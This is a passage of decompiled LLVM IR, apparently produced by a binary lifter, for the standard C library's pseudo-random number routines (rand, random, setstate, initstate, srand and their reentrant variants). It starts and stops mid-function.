  %v10_8054038 = icmp eq i8 %v0_8053fd7, 2
  %v1_805403a = icmp eq i1 %v10_8054038, false
  br i1 %v1_805403a, label %dec_label_pc_8054044, label %dec_label_pc_8054044.thread

dec_label_pc_8054044.thread:                      ; preds = %dec_label_pc_8054038
  store i8 3, i8* @global_var_8065b00.979, align 256
  br label %dec_label_pc_805404d

dec_label_pc_8054044:                             ; preds = %dec_label_pc_8054038
  %v9_8054044 = icmp eq i8 %v0_8053fd7, 3
  %v1_805404b = icmp eq i1 %v9_8054044, false
  br i1 %v1_805404b, label %dec_label_pc_805405e, label %dec_label_pc_805404d

dec_label_pc_805404d:                             ; preds = %dec_label_pc_8054044.thread, %dec_label_pc_8054044
  store i8 4, i8* @global_var_8065b00.979, align 256
  %v1_8054059 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805405e:                             ; preds = %dec_label_pc_8054044, %dec_label_pc_805405e
  br label %dec_label_pc_805405e

; uselistorder directives
  uselistorder i32 %v1_8054013, { 2, 1, 0 }
  uselistorder i32 %v1_8053f76, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 5, 3, 4, 2, 1 }
  uselistorder i8* @global_var_8065b00.979, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805405e, { 1, 0 }
  uselistorder label %dec_label_pc_805404d, { 1, 0 }
  uselistorder label %dec_label_pc_8053fd7, { 1, 0 }
  uselistorder label %dec_label_pc_8053f9f, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8054064 = call i32 @random()
  ret i32 %v0_8054064

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 7, 9, 4, 10, 6, 3, 2, 5, 1, 0, 8, 12, 11 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805406c = load i32, i32* @ebx, align 4
  store i32 %v0_805406c, i32* %stack_var_-4, align 4
  %v2_805407a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805407a, i32* @ebx, align 4
  %v2_805407f = call i32 @__pthread_return_void(i32 %v2_805407a, i32 134564427)
  %v1_805408b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f7a0.980 to i32))
  %v2_8054092 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805409c = call i32 @__GI_random_r(i32* nonnull @global_var_805f7b8, i32 %v2_8054092)
  store i32 ptrtoint (i32* @global_var_805f7b8 to i32), i32* @eax, align 4
  %v2_80540a6 = call i32 @__pthread_return_void(i32 %v2_805407a, i32 1)
  %v3_80540ab = load i32, i32* %stack_var_-8, align 4
  %v2_80540b2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80540b2, i32* @ebx, align 4
  ret i32 %v3_80540ab
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_80540c5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80540c5, i32* @eax, align 4
  %v2_80540ca = call i32 @__pthread_return_void(i32 %v2_80540c5, i32 134564427)
  %v1_80540d6 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f7a0.980 to i32))
  %v0_80540e2 = load i32, i32* bitcast (i32** @global_var_805f7c0.983 to i32*), align 64
  store i32 %v0_80540e2, i32* @ebx, align 4
  %v3_80540ec = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805f7b8)
  %v2_80540f4 = icmp slt i32 %v3_80540ec, 0
  br i1 %v2_80540f4, label %dec_label_pc_80540fb, label %dec_label_pc_80540f8

dec_label_pc_80540f8:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805f7bc.984 to i32), i32* @esi, align 4
  br label %dec_label_pc_80540fb

dec_label_pc_80540fb:                             ; preds = %entry, %dec_label_pc_80540f8
  store i32 %v2_80540c5, i32* @eax, align 4
  %v2_8054104 = call i32 @__pthread_return_void(i32 %v2_80540c5, i32 1)
  %v0_8054109 = load i32, i32* @esi, align 4
  ret i32 %v0_8054109

; uselistorder directives
  uselistorder label %dec_label_pc_80540fb, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8054120 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054120, i32* @ebx, align 4
  %v2_8054125 = call i32 @__pthread_return_void(i32 %v2_8054120, i32 134564427)
  %v1_8054131 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f7a0.980 to i32))
  %v0_805413b = load i32, i32* bitcast (i32** @global_var_805f7c0.983 to i32*), align 64
  store i32 %v0_805413b, i32* @esi, align 4
  %v4_805414d = inttoptr i32 %arg2 to i32*
  %v5_805414d = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_805414d, i32 %arg3, i32 ptrtoint (i32* @global_var_805f7b8 to i32))
  store i32 %v5_805414d, i32* @eax, align 4
  %v2_8054158 = call i32 @__pthread_return_void(i32 %v2_8054120, i32 1)
  ret i32 ptrtoint (i32** @global_var_805f7bc.984 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054168 = load i32, i32* @ebx, align 4
  store i32 %v0_8054168, i32* %stack_var_-4, align 4
  %v2_8054176 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8054176, i32* @ebx, align 4
  %v2_805417b = call i32 @__pthread_return_void(i32 %v2_8054176, i32 134564427)
  %v1_8054187 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f7a0.980 to i32))
  %v2_8054197 = sext i32 %arg1 to i64
  %v3_8054197 = call i32 @srandom_r(i64 %v2_8054197, i32 ptrtoint (i32* @global_var_805f7b8 to i32))
  store i32 ptrtoint (i32* @global_var_805f7b8 to i32), i32* @eax, align 4
  %v2_80541a1 = call i32 @__pthread_return_void(i32 %v2_8054176, i32 1)
  %v2_80541a9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80541a9, i32* @ebx, align 4
  ret i32 %v2_80541a1

; uselistorder directives
  uselistorder i32* @global_var_805f7b8, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805f7b8 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_80541af = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_80541bb = add i32 %arg1, 4
  store i32 %v1_80541bb, i32* %esi.global-to-local, align 4
  %v1_80541be = add i32 %tmp4, 12
  %v2_80541be = inttoptr i32 %v1_80541be to i32*
  %v3_80541be = load i32, i32* %v2_80541be, align 4
  store i32 %v3_80541be, i32* %ecx.global-to-local, align 4
  %v1_80541c1 = add i32 %tmp4, 8
  %v2_80541c1 = inttoptr i32 %v1_80541c1 to i32*
  %v3_80541c1 = load i32, i32* %v2_80541c1, align 4
  %v1_80541c4 = icmp eq i32 %v3_80541be, 0
  %v1_80541c6 = icmp eq i1 %v1_80541c4, false
  br i1 %v1_80541c6, label %dec_label_pc_80541d1, label %dec_label_pc_80541c8

dec_label_pc_80541c8:                             ; preds = %entry
  %v1_80541c8 = add i32 %v3_80541c1, -4
  %v2_80541c8 = inttoptr i32 %v1_80541c8 to i32*
  store i32 0, i32* %v2_80541c8, align 4
  br label %dec_label_pc_80541e1

dec_label_pc_80541d1:                             ; preds = %entry
  %v1_80541d1 = add i32 %tmp4, 4
  %v2_80541d1 = inttoptr i32 %v1_80541d1 to i32*
  %v3_80541d1 = load i32, i32* %v2_80541d1, align 4
  %v2_80541d4 = sub i32 %v3_80541d1, %v3_80541c1
  %v2_80541d6 = sdiv i32 %v2_80541d4, 4
  %v3_80541d9 = mul i32 %v2_80541d6, 5
  %v2_80541dc = add i32 %v3_80541d9, %v3_80541be
  store i32 %v2_80541dc, i32* %eax.global-to-local, align 4
  %v2_80541de = add i32 %v3_80541c1, -4
  %v3_80541de = inttoptr i32 %v2_80541de to i32*
  store i32 %v2_80541dc, i32* %v3_80541de, align 4
  br label %dec_label_pc_80541e1

dec_label_pc_80541e1:                             ; preds = %dec_label_pc_80541c8, %dec_label_pc_80541d1
  %v0_80541e1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80541e1 = add i32 %v0_80541e1, -4
  %v2_80541e1 = inttoptr i32 %v1_80541e1 to i32*
  %v3_80541e1 = load i32, i32* %v2_80541e1, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_80541e9 = ashr i32 %v3_80541e1, 31
  %v2_80541ea = zext i32 %v3_80541e1 to i64
  %v4_80541ea = zext i32 %v1_80541e9 to i64
  %v5_80541ea = mul nuw i64 %v4_80541ea, 4294967296
  %v6_80541ea = or i64 %v5_80541ea, %v2_80541ea
  %v8_80541ea = sdiv i64 %v6_80541ea, 5
  %v9_80541ea = trunc i64 %v8_80541ea to i32
  store i32 %v9_80541ea, i32* %eax.global-to-local, align 4
  %v10_80541ea = srem i64 %v6_80541ea, 5
  %v11_80541ea = trunc i64 %v10_80541ea to i32
  %v6_80541ef = icmp ugt i32 %v11_80541ea, 4
  br i1 %v6_80541ef, label %dec_label_pc_805422f, label %dec_label_pc_80541f1

dec_label_pc_80541f1:                             ; preds = %dec_label_pc_80541e1
  %v1_80541f1 = mul i32 %v11_80541ea, 4
  %v2_80541f1 = add i32 %v1_80541f1, ptrtoint (i32* @global_var_805dcd4.985 to i32)
  %v3_80541f1 = inttoptr i32 %v2_80541f1 to i32*
  %v4_80541f1 = load i32, i32* %v3_80541f1, align 4
  store i32 %v4_80541f1, i32* %ecx.global-to-local, align 4
  %v2_80541f8 = add i32 %v1_80541f1, ptrtoint (i32* @global_var_805dcc0.986 to i32)
  %v3_80541f8 = inttoptr i32 %v2_80541f8 to i32*
  %v4_80541f8 = load i32, i32* %v3_80541f8, align 4
  store i32 %v4_80541f8, i32* %ebp.global-to-local, align 4
  %v1_80541ff = load i32, i32* %ebx.global-to-local, align 4
  %v2_80541ff = add i32 %v1_80541ff, 16
  %v3_80541ff = inttoptr i32 %v2_80541ff to i32*
  store i32 %v4_80541f1, i32* %v3_80541ff, align 4
  %v0_8054202 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054202 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054202 = add i32 %v1_8054202, 20
  %v3_8054202 = inttoptr i32 %v2_8054202 to i32*
  store i32 %v0_8054202, i32* %v3_8054202, align 4
  %v1_8054205 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054205 = add i32 %v1_8054205, 12
  %v3_8054205 = inttoptr i32 %v2_8054205 to i32*
  store i32 %v11_80541ea, i32* %v3_8054205, align 4
  %v1_8054208 = icmp eq i32 %v11_80541ea, 0
  br i1 %v1_8054208, label %dec_label_pc_8054222, label %dec_label_pc_805420c

dec_label_pc_805420c:                             ; preds = %dec_label_pc_80541f1
  %v0_805420c = load i32, i32* %esi.global-to-local, align 4
  %v1_805420c = add i32 %v0_805420c, -4
  %v2_805420c = inttoptr i32 %v1_805420c to i32*
  %v3_805420c = load i32, i32* %v2_805420c, align 4
  %v1_805420f = ashr i32 %v3_805420c, 31
  %v0_8054210 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054210 = zext i32 %v3_805420c to i64
  %v4_8054210 = zext i32 %v1_805420f to i64
  %v5_8054210 = mul nuw i64 %v4_8054210, 4294967296
  %v6_8054210 = or i64 %v5_8054210, %v2_8054210
  %v7_8054210 = zext i32 %v0_8054210 to i64
  %v8_8054210 = sdiv i64 %v6_8054210, %v7_8054210
  %v9_8054210 = trunc i64 %v8_8054210 to i32
  %v2_8054212 = mul i32 %v9_8054210, 4
  %v3_8054212 = add i32 %v2_8054212, %v0_805420c
  %v1_8054215 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054215 = add i32 %v1_8054215, %v9_8054210
  store i32 %v2_8054215, i32* %eax.global-to-local, align 4
  %v1_8054217 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054217 = add i32 %v1_8054217, 4
  %v3_8054217 = inttoptr i32 %v2_8054217 to i32*
  store i32 %v3_8054212, i32* %v3_8054217, align 4
  %v0_805421a = load i32, i32* %eax.global-to-local, align 4
  %v1_805421a = ashr i32 %v0_805421a, 31
  %v0_805421b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805421b = zext i32 %v0_805421a to i64
  %v4_805421b = zext i32 %v1_805421a to i64
  %v5_805421b = mul nuw i64 %v4_805421b, 4294967296
  %v6_805421b = or i64 %v5_805421b, %v2_805421b
  %v7_805421b = zext i32 %v0_805421b to i64
  %v8_805421b = sdiv i64 %v6_805421b, %v7_805421b
  %v9_805421b = trunc i64 %v8_805421b to i32
  store i32 %v9_805421b, i32* %eax.global-to-local, align 4
  %v10_805421b = srem i64 %v6_805421b, %v7_805421b
  %v11_805421b = trunc i64 %v10_805421b to i32
  %v0_805421d = load i32, i32* %esi.global-to-local, align 4
  %v2_805421d = mul i32 %v11_805421b, 4
  %v3_805421d = add i32 %v2_805421d, %v0_805421d
  %v1_8054220 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054220 = inttoptr i32 %v1_8054220 to i32*
  store i32 %v3_805421d, i32* %v2_8054220, align 4
  br label %dec_label_pc_8054222

dec_label_pc_8054222:                             ; preds = %dec_label_pc_80541f1, %dec_label_pc_805420c
  %v0_8054222 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054222 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054222 = mul i32 %v1_8054222, 4
  %v3_8054222 = add i32 %v2_8054222, %v0_8054222
  store i32 %v3_8054222, i32* %eax.global-to-local, align 4
  %v1_8054225 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054225 = add i32 %v1_8054225, 8
  %v3_8054225 = inttoptr i32 %v2_8054225 to i32*
  store i32 %v0_8054222, i32* %v3_8054225, align 4
  %v0_8054228 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054228 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054228 = add i32 %v1_8054228, 24
  %v3_8054228 = inttoptr i32 %v2_8054228 to i32*
  store i32 %v0_8054228, i32* %v3_8054228, align 4
  br label %dec_label_pc_805423d

dec_label_pc_805422f:                             ; preds = %dec_label_pc_80541e1
  %v1_805422f = call i32 @__errno_location(i32 %v0_80541af)
  store i32 %v1_805422f, i32* %eax.global-to-local, align 4
  %v1_8054234 = inttoptr i32 %v1_805422f to i32*
  store i32 22, i32* %v1_8054234, align 4
  br label %dec_label_pc_805423d

dec_label_pc_805423d:                             ; preds = %dec_label_pc_8054222, %dec_label_pc_805422f
  %storemerge = phi i32 [ -1, %dec_label_pc_805422f ], [ 0, %dec_label_pc_8054222 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80541af, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8054222, { 1, 0 }
  uselistorder i32 %v11_80541ea, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_805423d, { 1, 0 }
  uselistorder label %dec_label_pc_8054222, { 1, 0 }
  uselistorder label %dec_label_pc_80541e1, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8054248 = load i32, i32* @ebx, align 4
  store i32 %v0_8054248, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8054251 = add i32 %tmp2, 8
  %v2_8054251 = inttoptr i32 %v1_8054251 to i32*
  %v3_8054251 = load i32, i32* %v2_8054251, align 4
  store i32 %v3_8054251, i32* %esi.global-to-local, align 4
  %v1_8054254 = add i32 %tmp2, 12
  %v2_8054254 = inttoptr i32 %v1_8054254 to i32*
  %v3_8054254 = load i32, i32* %v2_8054254, align 4
  %v4_8054254 = icmp eq i32 %v3_8054254, 0
  %v1_8054258 = icmp eq i1 %v4_8054254, false
  br i1 %v1_8054258, label %dec_label_pc_8054271, label %dec_label_pc_805425a

dec_label_pc_805425a:                             ; preds = %entry
  %v2_805425a = inttoptr i32 %v3_8054251 to i32*
  %v3_805425a = load i32, i32* %v2_805425a, align 4
  %v5_805425a = mul i32 %v3_805425a, 1103515245
  %v1_8054260 = add i32 %v5_805425a, 12345
  %v1_8054265 = urem i32 %v1_8054260, -2147483648
  store i32 %v1_8054265, i32* %eax.global-to-local, align 4
  store i32 %v1_8054265, i32* %v2_805425a, align 4
  %v0_805426c = load i32, i32* %eax.global-to-local, align 4
  %v1_805426c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805426c = inttoptr i32 %v1_805426c to i32*
  store i32 %v0_805426c, i32* %v2_805426c, align 4
  br label %dec_label_pc_805429d

dec_label_pc_8054271:                             ; preds = %entry
  %v1_8054271 = add i32 %tmp2, 4
  %v2_8054271 = inttoptr i32 %v1_8054271 to i32*
  %v3_8054271 = load i32, i32* %v2_8054271, align 4
  store i32 %v3_8054271, i32* %ecx.global-to-local, align 4
  %v2_8054274 = load i32, i32* %arg1, align 4
  store i32 %v2_8054274, i32* %edx.global-to-local, align 4
  %v1_8054276 = add i32 %tmp2, 24
  %v2_8054276 = inttoptr i32 %v1_8054276 to i32*
  %v3_8054276 = load i32, i32* %v2_8054276, align 4
  store i32 %v3_8054276, i32* %edi.global-to-local, align 4
  %v1_8054279 = inttoptr i32 %v3_8054271 to i32*
  %v2_8054279 = load i32, i32* %v1_8054279, align 4
  store i32 %v2_8054279, i32* %eax.global-to-local, align 4
  %v1_805427b = inttoptr i32 %v2_8054274 to i32*
  %v2_805427b = load i32, i32* %v1_805427b, align 4
  %v4_805427b = add i32 %v2_805427b, %v2_8054279
  store i32 %v4_805427b, i32* %v1_805427b, align 4
  %v0_805427d = load i32, i32* %edx.global-to-local, align 4
  %v1_805427d = inttoptr i32 %v0_805427d to i32*
  %v2_805427d = load i32, i32* %v1_805427d, align 4
  %v1_805427f = add i32 %v0_805427d, 4
  store i32 %v1_805427f, i32* %edx.global-to-local, align 4
  %v2_8054282 = udiv i32 %v2_805427d, 2
  %v1_8054284 = load i32, i32* %edi.global-to-local, align 4
  %v7_8054284 = icmp ult i32 %v1_805427f, %v1_8054284
  %v1_8054286 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054286 = inttoptr i32 %v1_8054286 to i32*
  store i32 %v2_8054282, i32* %v2_8054286, align 4
  %v0_8054289 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054289 = add i32 %v0_8054289, 4
  store i32 %v1_8054289, i32* %eax.global-to-local, align 4
  br i1 %v7_8054284, label %dec_label_pc_8054292, label %dec_label_pc_805428e

dec_label_pc_805428e:                             ; preds = %dec_label_pc_8054271
  %v0_805428e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805428e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054298

dec_label_pc_8054292:                             ; preds = %dec_label_pc_8054271
  %v1_8054292 = load i32, i32* %edi.global-to-local, align 4
  %v7_8054292 = icmp ult i32 %v1_8054289, %v1_8054292
  br i1 %v7_8054292, label %dec_label_pc_8054298, label %dec_label_pc_8054296

dec_label_pc_8054296:                             ; preds = %dec_label_pc_8054292
  %v0_8054296 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8054296, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054298

dec_label_pc_8054298:                             ; preds = %dec_label_pc_8054292, %dec_label_pc_805428e, %dec_label_pc_8054296
  %v0_8054298 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054298 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054298 = inttoptr i32 %v1_8054298 to i32*
  store i32 %v0_8054298, i32* %v2_8054298, align 4
  %v0_805429a = load i32, i32* %eax.global-to-local, align 4
  %v1_805429a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805429a = add i32 %v1_805429a, 4
  %v3_805429a = inttoptr i32 %v2_805429a to i32*
  store i32 %v0_805429a, i32* %v3_805429a, align 4
  br label %dec_label_pc_805429d

dec_label_pc_805429d:                             ; preds = %dec_label_pc_805425a, %dec_label_pc_8054298
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805429f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805429f, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8054265, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805429d, { 1, 0 }
  uselistorder label %dec_label_pc_8054298, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80542a4 = load i32, i32* @ebp, align 4
  %v0_80542a5 = load i32, i32* @edi, align 4
  %v0_80542a6 = load i32, i32* @esi, align 4
  %v0_80542a7 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_80542b2 = trunc i64 %arg1 to i32
  store i32 %v4_80542b2, i32* %eax.global-to-local, align 4
  %v1_80542b6 = add i32 %arg2, 12
  %v2_80542b6 = inttoptr i32 %v1_80542b6 to i32*
  %v3_80542b6 = load i32, i32* %v2_80542b6, align 4
  store i32 %v3_80542b6, i32* %edx.global-to-local, align 4
  %v6_80542bc = icmp ugt i32 %v3_80542b6, 4
  br i1 %v6_80542bc, label %dec_label_pc_8054330, label %dec_label_pc_80542be

dec_label_pc_80542be:                             ; preds = %entry
  %v1_80542be = add i32 %arg2, 8
  %v2_80542be = inttoptr i32 %v1_80542be to i32*
  %v3_80542be = load i32, i32* %v2_80542be, align 4
  store i32 %v3_80542be, i32* %ebx.global-to-local, align 4
  %v1_80542c1 = icmp eq i32 %v4_80542b2, 0
  %v1_80542c3 = icmp eq i1 %v1_80542c1, false
  br i1 %v1_80542c3, label %dec_label_pc_80542c7, label %dec_label_pc_80542c5

dec_label_pc_80542c5:                             ; preds = %dec_label_pc_80542be
  %v1_80542c5 = and i32 %v4_80542b2, -256
  %v2_80542c5 = or i32 %v1_80542c5, 1
  store i32 %v2_80542c5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80542c7

dec_label_pc_80542c7:                             ; preds = %dec_label_pc_80542be, %dec_label_pc_80542c5
  %v0_80542c7 = phi i32 [ %v4_80542b2, %dec_label_pc_80542be ], [ %v2_80542c5, %dec_label_pc_80542c5 ]
  %v2_80542c7 = inttoptr i32 %v3_80542be to i32*
  store i32 %v0_80542c7, i32* %v2_80542c7, align 4
  %v1_80542c9 = icmp eq i32 %v3_80542b6, 0
  br i1 %v1_80542c9, label %dec_label_pc_805432e, label %dec_label_pc_80542cd

dec_label_pc_80542cd:                             ; preds = %dec_label_pc_80542c7
  %v0_80542cd = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80542cd, i32* %edx.global-to-local, align 4
  %v0_80542cf = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80542cf, i32* %ecx.global-to-local, align 4
  %v0_80542d1 = load i32, i32* @esi, align 4
  %v1_80542d1 = add i32 %v0_80542d1, 16
  %v2_80542d1 = inttoptr i32 %v1_80542d1 to i32*
  %v3_80542d1 = load i32, i32* %v2_80542d1, align 4
  store i32 %v3_80542d1, i32* %eax.global-to-local, align 4
  %v4_80542d9 = sext i32 %v3_80542d1 to i64
  store i64 %v4_80542d9, i64* %stack_var_-40, align 8
  %v5_805430b27 = icmp sgt i32 %v3_80542d1, 1
  br i1 %v5_805430b27, label %dec_label_pc_80542de, label %dec_label_pc_805430d

dec_label_pc_80542de:                             ; preds = %dec_label_pc_80542cd, %dec_label_pc_80542de.dec_label_pc_80542de_crit_edge
  %v0_8054302 = phi i32 [ %v0_8054302.pre, %dec_label_pc_80542de.dec_label_pc_80542de_crit_edge ], [ %v0_80542cf, %dec_label_pc_80542cd ]
  %v0_80542de = phi i32 [ %v0_80542de.pre, %dec_label_pc_80542de.dec_label_pc_80542de_crit_edge ], [ %v0_80542cd, %dec_label_pc_80542cd ]
  %v0_805430528 = phi i32 [ %v0_8054308.pre, %dec_label_pc_80542de.dec_label_pc_80542de_crit_edge ], [ 1, %dec_label_pc_80542cd ]
  %v1_80542e5 = ashr i32 %v0_80542de, 31
  %v2_80542e6 = zext i32 %v0_80542de to i64
  %v4_80542e6 = zext i32 %v1_80542e5 to i64
  %v5_80542e6 = mul nuw i64 %v4_80542e6, 4294967296
  %v6_80542e6 = or i64 %v5_80542e6, %v2_80542e6
  %v8_80542e6 = sdiv i64 %v6_80542e6, 127773
  %v9_80542e6 = trunc i64 %v8_80542e6 to i32
  %v10_80542e6 = srem i64 %v6_80542e6, 127773
  %v3_80542ec = mul nsw i64 %v10_80542e6, 16807
  %v4_80542ec = trunc i64 %v3_80542ec to i32
  %v3_80542f2 = mul i32 %v9_80542e6, 2836
  store i32 %v3_80542f2, i32* %eax.global-to-local, align 4
  %v2_80542f8 = sub i32 %v4_80542ec, %v3_80542f2
  %v13_80542f8 = icmp slt i32 %v2_80542f8, 0
  %v1_80542fa = icmp eq i1 %v13_80542f8, false
  %v1_80542fc = add i32 %v2_80542f8, 2147483647
  %v2_80542f8.v1_80542fc = select i1 %v1_80542fa, i32 %v2_80542f8, i32 %v1_80542fc
  store i32 %v2_80542f8.v1_80542fc, i32* %edx.global-to-local, align 4
  %v1_8054302 = add i32 %v0_8054302, 4
  store i32 %v1_8054302, i32* %ecx.global-to-local, align 4
  %v1_8054305 = add i32 %v0_805430528, 1
  store i32 %v1_8054305, i32* @edi, align 4
  %v2_8054306 = inttoptr i32 %v1_8054302 to i32*
  store i32 %v2_80542f8.v1_80542fc, i32* %v2_8054306, align 4
  %v0_8054308.pre = load i32, i32* @edi, align 4
  %v3_8054308.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8054308.pre to i32
  %v5_805430b = icmp slt i32 %v0_8054308.pre, %extract.t12
  br i1 %v5_805430b, label %dec_label_pc_80542de.dec_label_pc_80542de_crit_edge, label %dec_label_pc_8054308.dec_label_pc_805430d_crit_edge

dec_label_pc_80542de.dec_label_pc_80542de_crit_edge: ; preds = %dec_label_pc_80542de
  %v0_80542de.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8054302.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80542de

dec_label_pc_8054308.dec_label_pc_805430d_crit_edge: ; preds = %dec_label_pc_80542de
  %v0_805430d.pre = load i32, i32* @esi, align 4
  %v0_8054310.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805430d

dec_label_pc_805430d:                             ; preds = %dec_label_pc_8054308.dec_label_pc_805430d_crit_edge, %dec_label_pc_80542cd
  %v0_8054310 = phi i32 [ %v0_8054310.pre, %dec_label_pc_8054308.dec_label_pc_805430d_crit_edge ], [ %v0_80542cf, %dec_label_pc_80542cd ]
  %v0_805430d = phi i32 [ %v0_805430d.pre, %dec_label_pc_8054308.dec_label_pc_805430d_crit_edge ], [ %v0_80542d1, %dec_label_pc_80542cd ]
  %v1_805430d = add i32 %v0_805430d, 20
  %v2_805430d = inttoptr i32 %v1_805430d to i32*
  %v3_805430d = load i32, i32* %v2_805430d, align 4
  store i32 %v3_805430d, i32* %eax.global-to-local, align 4
  %v2_8054310 = add i32 %v0_805430d, 4
  %v3_8054310 = inttoptr i32 %v2_8054310 to i32*
  store i32 %v0_8054310, i32* %v3_8054310, align 4
  %v0_8054313 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054313 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054313 = mul i32 %v1_8054313, 4
  %v3_8054313 = add i32 %v2_8054313, %v0_8054313
  store i32 %v3_8054313, i32* %eax.global-to-local, align 4
  %v1_8054316 = load i32, i32* @esi, align 4
  %v2_8054316 = inttoptr i32 %v1_8054316 to i32*
  store i32 %v3_8054313, i32* %v2_8054316, align 4
  %v3_8054318 = load i64, i64* %stack_var_-40, align 8
  %v6_8054318 = mul nsw i64 %v3_8054318, 10
